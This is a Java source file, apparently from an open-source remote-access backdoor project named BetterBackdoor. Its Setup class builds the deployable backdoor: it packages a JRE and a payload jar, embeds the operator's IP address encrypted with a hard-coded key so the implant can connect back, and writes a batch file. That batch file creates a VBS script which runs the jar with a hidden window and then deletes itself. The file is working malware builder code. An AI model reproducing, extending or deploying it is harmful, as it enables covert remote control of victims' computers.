package com.github.thatcherdev.betterbackdoor;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.Writer;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.io.FileUtils;
import com.github.thatcherdev.betterbackdoor.backend.Utils;

public class Setup {

	/**
	 * Copys and creates all necesarry files and directories needed for a working
	 * backdoor to directory "backdoor".
	 *
	 * @param packageJre if a JRE should be packaged with backdoor
	 * @throws IOException
	 */
	public static void create(boolean packageJre) throws IOException {
		if (packageJre) {
			String jrePath = System.getProperty("java.home");
			FileUtils.copyDirectory(new File(jrePath + File.separator + "bin"),
					new File("backdoor" + File.separator + "jre" + File.separator + "bin"));
			FileUtils.copyDirectory(new File(jrePath + File.separator + "lib"),
					new File("backdoor" + File.separator + "jre" + File.separator + "lib"));
		} else if ((BetterBackdoor.os.contains("Linux") || BetterBackdoor.os.contains("Mac"))
				&& new File("jre").isDirectory()) {
			FileUtils.copyDirectory(new File("jre"), new File("backdoor" + File.separator + "jre"));
			createBat("backdoor" + File.separator + "run.bat", "jre", "run");
		}
		FileUtils.copyDirectory(new File("scripts"), new File("backdoor" + File.separator + "scripts"));
		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
				new File("backdoor" + File.separator + "run.jar"));
		appendJar("backdoor" + File.separator + "run.jar", "ip", Utils.crypt(Utils.getIP(), "BetterBackdoorIP"));
	}

	/**
	 * Creates a '.bat' batch file for running a jar file in a Java Runtime
	 * Environment.
	 *
	 * @param filePath Path of '.bat' batch file to create.
	 * @param jrePath  Path to jre.
	 * @param jarName  Name of '.jar' file to run.
	 * @throws FileNotFoundException
	 */
	private static void createBat(String filePath, String jrePath, String jarName) throws FileNotFoundException {
		PrintWriter out = new PrintWriter(new File(filePath));
		out.println(
				"@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c if exist "
						+ jrePath + "\\ (" + jrePath + "\\bin\\java " + "-jar " + jarName + ".jar) else (java -jar "
						+ jarName
						+ ".jar)\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 3 > nul\n del run.vbs\n @exit\n"
						+ ") else (\ncall:delvbs\n)\ngoto:eof");
		out.flush();
		out.close();
	}

	/**
	 * Puts a new file with name {@link newFile} and contents
	 * {@link newFileContents} into existing jar file with name {@link jarFile}.
	 * 
	 * @param jarFile         name of jar file to put new file with name
	 *                        {@link newFile} in
	 * @param newFile         name of new file to put in jar file with name
	 *                        {@link jarFile}
	 * @param newFileContents contents of new file with name {@link newFile} to put
	 *                        in jar file
	 * @throws IOException
	 */
	private static void appendJar(String jarFile, String newFile, String newFileContents) throws IOException {
		Map<String, String> env = new HashMap<>();
		env.put("create", "true");
		try (FileSystem fileSystem = FileSystems.newFileSystem(URI.create("jar:" + Paths.get(jarFile).toUri()), env)) {
			try (Writer writer = Files.newBufferedWriter(fileSystem.getPath(newFile), StandardCharsets.UTF_8,
					StandardOpenOption.CREATE)) {
				writer.write(newFileContents);
				writer.close();
			}
		}
	}
}
